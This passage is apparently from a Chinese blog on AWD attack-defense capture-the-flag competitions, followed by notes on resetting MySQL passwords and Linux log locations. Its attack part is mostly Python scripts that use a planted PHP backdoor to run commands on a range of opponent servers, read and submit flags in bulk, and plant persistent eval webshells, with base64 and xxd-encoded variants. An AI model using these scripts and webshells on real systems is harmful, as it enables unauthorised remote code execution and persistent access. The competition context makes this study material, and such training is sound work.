title="3.利用后门批量getflag并提交"></a>3.利用后门批量getflag并提交</h3><p>burp抓包，发现flag以json形式传输</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/flag</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.182.130:39999<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/plain, */*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json;charset=utf-8<br><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>9ad36c305d6a2d2514434a4c10e7e13f<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>55<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.182.130:39999<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.182.130:39999/<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;flag&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;SL&#123;7a2ecc20361b7a104798b6bba6222b3972e114a2&#125;&quot;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p>编写脚本自动获取flag并提交</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># coding: UTF-8</span><br>import requests<br>import json<br><br><span class="hljs-attribute">url1</span>=<span class="hljs-string">&quot;http://xxxx:&quot;</span><br><span class="hljs-attribute">url2</span>=<span class="hljs-string">&quot;&quot;</span><br><br>flaglist=[]<br><br><span class="hljs-attribute">path</span>=<span class="hljs-string">&quot;/include/shell.php&quot;</span><br><span class="hljs-attribute">passwd</span>=<span class="hljs-string">&quot;admin_ccmd&quot;</span><br><br><span class="hljs-attribute">flagadd</span>=<span class="hljs-string">&quot;http://xxxx:8801/api/flag&quot;</span>   #提交flag的地址<br><br><span class="hljs-comment">#payload = &#123;passwd: &#x27;system(\&#x27;cat /f*\&#x27;);&#x27;&#125;</span><br>payload = &#123;passwd: <span class="hljs-string">&#x27;system(\&#x27;</span>cat /flag\<span class="hljs-string">&#x27;);&#x27;</span>&#125;<br><br><br>headers=&#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#x27;</span>,<br>    &#125;<br>headersflag=&#123;<br>        <span class="hljs-string">&#x27;Host&#x27;</span>: <span class="hljs-string">&#x27;xxxx&#x27;</span>,<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;application/json, text/plain, */*&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json;charset=utf-8&#x27;</span>,<br>        <span class="hljs-string">&#x27;Authorization&#x27;</span>: <span class="hljs-string">&#x27;bada82467423a6526d4d25abbe8cc43a&#x27;</span>,<br>        <span class="hljs-string">&#x27;Origin&#x27;</span>: <span class="hljs-string">&#x27;http://xxxx&#x27;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;http://xxxx/&#x27;</span>,<br>    &#125;<br><br>i = 0<br><br><span class="hljs-keyword">for</span> url2 <span class="hljs-keyword">in</span> range(8802,8810):<br>    url = url1 + str(url2) +path<br>    #<span class="hljs-built_in">print</span>(url1 + str(url2))<br>    <span class="hljs-attribute">res</span>=requests.post(url,payload, <span class="hljs-attribute">headers</span>=headers)<br>    try:<br>        <span class="hljs-built_in">print</span>(url1 + str(url2),res.text)<br>        # flag存入列表中<br>        flaglist.append(str(res.text))<br>        #<span class="hljs-built_in">print</span>(flaglist[i])<br>        body = &#123;<span class="hljs-string">&quot;flag&quot;</span>: str(flaglist[i])&#125;<br>        res = requests.post(flagadd, <span class="hljs-attribute">headers</span>=headersflag, <span class="hljs-attribute">data</span>=json.dumps(body))<br>        i += 1<br>    except:<br>        pass<br></code></pre></td></tr></table></figure><p>如果嫌写脚本麻烦，可以把flag存入字典，利用burp爆破，也可以实现批量提交flag。不过大括号<code>&#123;&#125;</code>可能会被编码导致flag错误。</p><h3 id="4-利用后门写shell"><a href="#4-利用后门写shell" class="headerlink" title="4.利用后门写shell"></a>4.利用后门写shell</h3><p>预留后门可能会被删除，要想持续拿分需要写shell，这里利用命令执行和代码执行来写马<br><strong>利用命令执行写马</strong></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">1.Linux下写shell</span><br><span class="language-xml">$ echo &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(\<span class="hljs-variable">$_POST</span>[<span class="hljs-number">123</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; &gt; webshell.php</span><br><span class="language-xml">$ echo PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pOyA/Pg==|base64 -d &gt; webshell.php   #base64编码绕过</span><br><span class="language-xml">$ echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php #xxd绕过</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">2.windows下写shell</span><br><span class="language-xml">&gt;echo ^</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($^_POST[<span class="hljs-number">123</span>]); ?^&gt; &gt; webshell.php</span><br></code></pre></td></tr></table></figure><p><strong>利用代码执行写马</strong></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?code=fputs(fopen(&#x27;./webshell.php.php&#x27;,&#x27;w&#x27;),&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">123</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;);</span><br><span class="language-xml"></span><br><span class="language-xml">?code=file_put_contents(&#x27;webshell.php.php&#x27;, &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">123</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml"> &#x27;);</span><br><span class="language-xml"></span><br><span class="language-xml">?code=file_put_contents($_POST[f], $_POST[d]); </span><br><span class="language-xml">post: f=webshell.php&amp;d=</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">123</span>]); <span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>然后利用脚本实现</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs vim"># coding: UTF-<span class="hljs-number">8</span><br>import requests<br><br>url = <span class="hljs-string">&quot;http://192.168.182.130:8808&quot;</span><br><br>shell_path = url + <span class="hljs-string">&quot;/include/shell.php&quot;</span><br>shell_passwd = <span class="hljs-string">&quot;admin_ccmd&quot;</span><br><br>#利用预留后门<br>payload = &#123;shell_passwd: <span class="hljs-string">&#x27;system(\&#x27;</span><span class="hljs-keyword">cat</span> /<span class="hljs-keyword">f</span>*\<span class="hljs-string">&#x27;);&#x27;</span>&#125;<br><span class="hljs-keyword">res</span> = requests.post(shell_path, payload)<br><span class="hljs-keyword">print</span>(<span class="hljs-keyword">res</span>.text)<br><br><br>#payload1利用预留后门上传<span class="hljs-keyword">shell</span><br>payload1 = &#123;shell_passwd: <span class="hljs-string">&#x27;system(\&#x27;</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;?php @eval(\$_POST[atkx]);?&gt;&quot;</span> &gt; /var/www/html/atkx.php\<span class="hljs-string">&#x27;);&#x27;</span>&#125;<br><span class="hljs-keyword">res</span> = requests.post(shell_path, payload1)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;shell已上传&quot;</span>)<br><br>#payload2利用预留后门上传<span class="hljs-keyword">shell</span>，并getflag<br>my_shell_path = url + <span class="hljs-string">&quot;/atkx.php&quot;</span><br>my_shell_passwd = <span class="hljs-string">&quot;atkx&quot;</span><br>payload2 = &#123;my_shell_passwd: <span class="hljs-string">&#x27;system(\&#x27;</span><span class="hljs-keyword">cat</span> /<span class="hljs-keyword">f</span>*\<span class="hljs-string">&#x27;);&#x27;</span>&#125;<br><span class="hljs-keyword">res</span> = requests.post(my_shell_path, payload2)<br><span class="hljs-keyword">print</span>(<span class="hljs-keyword">res</span>.text)<br></code></pre></td></tr></table></figure><p>批量后门写shell</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs vim">import requests<br><br>url_head=<span class="hljs-string">&quot;http://192.168.182.130&quot;</span><br><span class="hljs-keyword">for</span> url2 in <span class="hljs-built_in">range</span>(<span class="hljs-number">8801</span>,<span class="hljs-number">8805</span>):<br>    <span class="hljs-keyword">try</span>:<br>        url =  url_head+<span class="hljs-string">&quot;:&#123;&#125;&quot;</span>.format(url2)<br><br>        shell_path = url + <span class="hljs-string">&quot;/include/shell.php&quot;</span><br>        shell_passwd = <span class="hljs-string">&quot;admin_ccmd&quot;</span><br>        <span class="hljs-keyword">print</span>(shell_path)<br><br>        #payload1利用预留后门上传<span class="hljs-keyword">shell</span><br>        payload1 = &#123;shell_passwd: <span class="hljs-string">&#x27;system(\&#x27;</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;?php @eval(\$_POST[atkx]);?&gt;&quot;</span> &gt; /var/www/html/atkx1.php\<span class="hljs-string">&#x27;);&#x27;</span>&#125;<br>        <span class="hljs-keyword">res</span> = requests.post(shell_path, payload1)<br>        <span class="hljs-keyword">print</span>(url + <span class="hljs-string">&quot; shell写入成功！！！！！！！&quot;</span>)<br>        #<br><br>        # #payload2通过上传的<span class="hljs-keyword">shell</span>来getflag<br>        # my_shell_path = url + <span class="hljs-string">&quot;/atkx1.php&quot;</span><br>        # my_shell_passwd = <span class="hljs-string">&quot;atkx&quot;</span><br>        # payload2 = &#123;my_shell_passwd: <span class="hljs-string">&#x27;system(\&#x27;</span><span class="hljs-keyword">cat</span> /flag\<span class="hljs-string">&#x27;);&#x27;</span>&#125;<br>        # <span class="hljs-keyword">res</span> = requests.post(my_shell_path, payload2)<br>        # <span class="hljs-keyword">print</span>(url,<span class="hljs-keyword">res</span>.text)<br>    except:<br>        pass<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.预留后门的权限维持特别重要，不要急着拿flag，往后每一轮预留后门都会减少。</p><p>2.AWD一般使用的是cms，尽量多收集一些cms的POC和EXP，以备不时之需。</p><p>3.防守注意查看日志看别人是怎么攻击自己的，然后尝试攻击其他人，为了干扰别人，可以先打一波流量，混淆视听。</p><p>4.检查后门，保证自己的网站上没有d盾可以扫出来的后门，检查计划任务或者可疑进程。</p><p>5.比赛一轮大概几分钟，时间比较紧张，需要提高自己的代码审计能力以及自动化脚本的编写能力，实现自动化攻击。</p><h1 id="linux下，mysql数据库的忘记密码，查看用户，以及修改用户信息"><a href="#linux下，mysql数据库的忘记密码，查看用户，以及修改用户信息" class="headerlink" title="linux下，mysql数据库的忘记密码，查看用户，以及修改用户信息"></a>linux下，mysql数据库的忘记密码，查看用户，以及修改用户信息</h1><p>   刚好遇到的，也是自己不熟悉的部分，因此查了一些资料，大概把这几个给总结一下。</p><h2 id="一、数据库忘记密码"><a href="#一、数据库忘记密码" class="headerlink" title="一、数据库忘记密码"></a><strong>一、数据库忘记密码</strong></h2><p>1、如果是root用户忘记密码的话，那就没办法了，只能通过暂时无密码登录的状态登上去</p><p>步骤：<br>（1）进入Mysql的配置文件：vi &#x2F;etc&#x2F;my.cnf<br>（2）在配置文件的末尾加上： <a href="https://so.csdn.net/so/search?q=skip&spm=1001.2101.3001.7020">skip</a>-grant-tables，如：<br><img src="D:/bk/blog/source/pic/SouthEast.png" alt="这里写图片描述"></p><p>（3）重启Mysql，然后直接mysql -u root -p直接登入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cobol">注意：<br><br><br><br>（1）如果是无密码登录的话，首先确认服务器出于安全的状态，也就是没有人能够任意地连接MySQL数据库。 因为在重新设置MySQL的root密码的期间，MySQL数据库完全出于没有密码保护的状态下，其他的用户也可以任意地登录和修改MySQL的信息。可以采用将MySQL对外的端口封闭，并且停止Apache以及所有的用户进程的方法实现服务器的准安全状态。最安全的状态是到服务器的Console上面操作，并且拔掉网线。 <br></code></pre></td></tr></table></figure><ul><li></li></ul><h2 id="二、修改数据库的密码"><a href="#二、修改数据库的密码" class="headerlink" title="二、修改数据库的密码"></a><strong>二、修改数据库的密码</strong></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>、首先要先知道，如果以root权限登录数据库的话，你可以看到mysql下有个<span class="hljs-keyword">user</span>表，里面存储的是全部的用户信息，包括<span class="hljs-keyword">user</span>,host,password，查询的命令：<br></code></pre></td></tr></table></figure><ul><li></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,host,password <span class="hljs-keyword">from</span> mysql.user;<br></code></pre></td></tr></table></figure><ul><li></li></ul><p>2、如果要修改用户的信息，则可以通过sql语句直接修改，例如，要修改用户名为admin 的密码为admin:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs cobol">//查询所有的用户信息<br><br><br><br>mysql&gt;select user,host,password from mysql.user;<br><br><br><br>//修改admin用户的密码<br><br><br><br>mysql&gt;update user set password=password(&#x27;admin&#x27;) where user=&#x27;admin&#x27;;<br><br><br><br>//刷新权限表（必须）<br><br><br><br>mysql&gt;flush privileges;<br><br><br><br>//修改成功之后要退出mysql数据库，重新登录一下<br><br><br><br>mysql&gt;exit;<br></code></pre></td></tr></table></figure><ul><li></li></ul><p>3、关于给用户授权的问题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs cobol">//登录MYSQL(有ROOT权限)。我里我以ROOT身份登录.<br><br><br><br>　　@&gt;mysql -u root -p<br><br><br><br>　　@&gt;密码<br><br><br><br>　　//首先为用户创建一个数据库(phplampDB)<br><br><br><br>　　mysql&gt;create database phplampDB;<br><br><br><br>　　//授权phplamp用户拥有phplamp数据库的所有权限。<br><br><br><br>　　&gt;grant all privileges on phplampDB.* to phplamp@localhost identified by &#x27;1234&#x27;;<br><br><br><br>　　//刷新系统权限表<br><br><br><br>　　mysql&gt;flush privileges;<br><br><br><br>　　mysql&gt;其它操作<br><br><br><br>　　/*<br><br><br><br>　　如果想指定部分权限给一用户，可以这样来写:<br><br><br><br>　　mysql&gt;grant select,update on phplampDB.* to phplamp@localhost identified by &#x27;1234&#x27;;<br><br><br><br>　　//刷新系统权限表。<br><br><br><br>　　mysql&gt;flush privileges;<br><br><br><br>　　*/<br></code></pre></td></tr></table></figure><ul><li></li></ul><p>4、关于创建新用户的问题：</p><p>“&#96;<br>&#x2F;&#x2F;登录MYSQL<br>　　@&gt;mysql -u root -p<br>　　@&gt;密码<br>　　&#x2F;&#x2F;创建用户<br>　　mysql&gt; insert into mysql.user(Host,User,Password) values(“localhost”,”phplamp”,password(“1234”));<br>　　&#x2F;&#x2F;刷新系统权限表<br>　　mysql&gt;flush privileges;<br>　　这样就创建了一个名为：phplamp 密码为：1234 的用户。<br>　　然后登录一下。<br>　　mysql&gt;exit;<br>　　@&gt;mysql -u phplamp -p<br>　　@&gt;输入密码<br>　　mysql&gt;登录成功</p><p><strong>linux系统日志在哪？</strong></p><p>日志文件的默认路径是：&#x2F;var&#x2F;log</p><p>下面是几个重要的日志文件的路径及其包含的信息</p><p>&#x2F;var&#x2F;log&#x2F;syslog：它和&#x2F;etc&#x2F;log&#x2F;messages日志文件不同，它只记录警告信息，常常是系统出问题的信息。</p><p>&#x2F;var&#x2F;log&#x2F;messages：包括整体系统信息，其中也包含系统启动期间的日志。此外，还包括mail，cron，daemon，kern和auth等内容</p><p>&#x2F;var&#x2F;log&#x2F;user.log：记录所有等级用户信息的日志。</p><p>&#x2F;var&#x2F;log&#x2F;auth.log：包含系统授权信息，包括用户登录和使用的权限机制等。</p><p>&#x2F;var&#x2F;log&#x2F;daemon.log：包含各种系统后台守护进程日志信息。</p><p>&#x2F;var&#x2F;log&#x2F;kern.log：包含内核产生的日志，有助于在定制内核时解决问题。</p><p><img src="D:/bk/blog/source/pic/image-20230514182429786.png" alt="image-20230514182429786"></p><p><img src="D:/bk/blog/source/pic/image-20230514182446309.png" alt="image-20230514182446309"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
